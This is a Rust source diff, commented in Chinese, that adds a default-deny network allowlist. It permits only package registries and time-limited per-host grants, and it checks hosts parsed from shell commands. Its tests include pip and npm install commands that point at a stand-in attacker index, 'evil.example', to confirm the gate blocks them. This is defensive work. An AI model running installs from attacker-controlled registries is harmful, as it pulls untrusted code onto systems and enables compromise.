@@ -204,3 +204,146 @@ mod tests {
         std::fs::remove_dir_all(&p).ok();
     }
 }
+
+// ===== 网络白名单（2026-10-21 第二轮）=====
+//
+// 口径（人定的）：网络默认拒绝，**只放行包仓库**；允许只给本次会话或 24 小时，可随时收回。
+// 这一层只管"这个域名现在许不许"，不管怎么执行——真正的拒绝点由调用方给。
+
+/// 默认放行的包仓库（装依赖要用的正经仓库）。
+pub const REGISTRY_HOSTS: &[&str] = &[
+    "pypi.org",
+    "files.pythonhosted.org",
+    "registry.npmjs.org",
+    "registry.yarnpkg.com",
+    "crates.io",
+    "static.crates.io",
+    "index.crates.io",
+    "repo.maven.apache.org",
+    "repo1.maven.org",
+];
+
+/// 从 URL 里取主机名：`https://pypi.org/simple` → `pypi.org`；认不出返回 `None`。
+pub fn host_of(url: &str) -> Option<String> {
+    let rest = url.split_once("://").map(|(_, r)| r).unwrap_or(url);
+    let host = rest.split(['/', '?', '#']).next()?.trim();
+    if host.is_empty() || !host.contains('.') {
+        return None;
+    }
+    let host = host.split(':').next().unwrap_or(host); // 去掉端口
+    let host = host.trim_start_matches("www.");
+    // 最后一段必须是字母 TLD（≥2 位）——否则 `3.12` 这种版本号会被当成域名。
+    let tld = host.rsplit('.').next().unwrap_or("");
+    if host.is_empty() || tld.len() < 2 || !tld.chars().all(|c| c.is_ascii_alphabetic()) {
+        return None;
+    }
+    Some(host.to_ascii_lowercase())
+}
+
+/// 一条命令里出现的网络目标主机（`--index-url X` / `--registry X` / 裸 URL）。
+///
+/// 只认"看得出是 URL"的片段：**认不出就不算**（不猜），免得把版本号当域名。
+pub fn hosts_in_command(cmd: &str) -> Vec<String> {
+    let mut out: Vec<String> = Vec::new();
+    for tok in cmd.split_whitespace() {
+        let candidate = tok.trim_matches(|c| c == '"' || c == '\'' || c == ',' || c == ';');
+        if !(candidate.contains("://") || candidate.starts_with("--")) {
+            continue;
+        }
+        let value = match candidate.split_once('=') {
+            Some((_, v)) => v,
+            None => candidate,
+        };
+        if let Some(h) = host_of(value) {
+            if !out.contains(&h) {
+                out.push(h);
+            }
+        }
+    }
+    out
+}
+
+/// 这个主机现在允许吗：**白名单** 或 允许表里的 `net:<host>`（本次会话 / 24 小时）。
+pub fn net_allowed_at(path: &Path, host: &str, now: i64) -> bool {
+    let h = host.to_ascii_lowercase();
+    if REGISTRY_HOSTS.iter().any(|w| h == *w || h.ends_with(&format!(".{w}"))) {
+        return true;
+    }
+    allowed_at(path, &format!("net:{h}"), now)
+}
+
+/// 命令过网络闸门：返回第一个被拒的主机（`Err(host)`），全放行返回 `Ok(Vec<host>)`。
+pub fn net_gate(path: &Path, cmd: &str, now: i64) -> Result<Vec<String>, String> {
+    let hosts = hosts_in_command(cmd);
+    for h in &hosts {
+        if !net_allowed_at(path, h, now) {
+            return Err(h.clone());
+        }
+    }
+    Ok(hosts)
+}
+
+#[cfg(test)]
+mod net_tests {
+    use super::*;
+
+    fn tmp(tag: &str) -> PathBuf {
+        let d = std::env::temp_dir().join(format!("jw-net-{tag}-{}", std::process::id()));
+        std::fs::remove_dir_all(&d).ok();
+        std::fs::create_dir_all(&d).expect("建临时目录");
+        d
+    }
+
+    /// 取主机：带协议/端口/路径都要能剥掉；认不出（没有点）就别猜。
+    #[test]
+    fn 取主机名() {
+        assert_eq!(host_of("https://pypi.org/simple").as_deref(), Some("pypi.org"));
+        assert_eq!(host_of("https://registry.npmjs.org:443/x").as_deref(), Some("registry.npmjs.org"));
+        assert_eq!(host_of("https://www.crates.io"), host_of("https://crates.io"));
+        assert_eq!(host_of("3.12"), None, "版本号不是域名");
+        assert_eq!(host_of("localhost"), None, "没有点就不当域名");
+    }
+
+    /// 命令里认得出 `--index-url` / `--registry` / 裸 URL，重复只留一个。
+    #[test]
+    fn 从命令里取主机() {
+        let hs = hosts_in_command("pip install -i https://pypi.org/simple --extra-index-url=https://evil.example/x pypi.org");
+        assert!(hs.contains(&"pypi.org".to_string()), "{hs:?}");
+        assert!(hs.contains(&"evil.example".to_string()), "{hs:?}");
+        assert_eq!(hs.iter().filter(|h| *h == "pypi.org").count(), 1, "重复只留一个");
+    }
+
+    /// 白名单直接放行；名单外的域名默认拒绝。
+    #[test]
+    fn 白名单放行_名单外拒绝() {
+        let d = tmp("wl");
+        let f = d.join("allow.json");
+        assert!(net_allowed_at(&f, "pypi.org", 100), "白名单该放行");
+        assert!(net_allowed_at(&f, "static.crates.io", 100), "白名单该放行");
+        assert!(!net_allowed_at(&f, "evil.example", 100), "名单外该拒绝");
+        std::fs::remove_dir_all(&d).ok();
+    }
+
+    /// 24 小时允许能放行名单外的域名，**到点失效**。
+    #[test]
+    fn 名单外可临时允许_到点失效() {
+        let d = tmp("allow");
+        let f = d.join("allow.json");
+        allow_24h(&f, "net:evil.example", 1_000).expect("写允许");
+        assert!(net_allowed_at(&f, "evil.example", 1_000 + 60), "允许期内该放行");
+        assert!(!net_allowed_at(&f, "evil.example", 1_000 + 86_401), "过了 24 小时必须再拒");
+        std::fs::remove_dir_all(&d).ok();
+    }
+
+    /// 闸门：全放行返回主机清单；遇到名单外的就返回那一个（**先拒后跑**）。
+    #[test]
+    fn 闸门先拒后跑() {
+        let d = tmp("gate");
+        let f = d.join("allow.json");
+        let ok = net_gate(&f, "pip install -i https://pypi.org/simple .", 10).expect("白名单该放行");
+        assert_eq!(ok, vec!["pypi.org".to_string()]);
+        let bad = net_gate(&f, "npm i --registry https://evil.example/x", 10).unwrap_err();
+        assert_eq!(bad, "evil.example");
+        std::fs::remove_dir_all(&d).ok();
+    }
+}
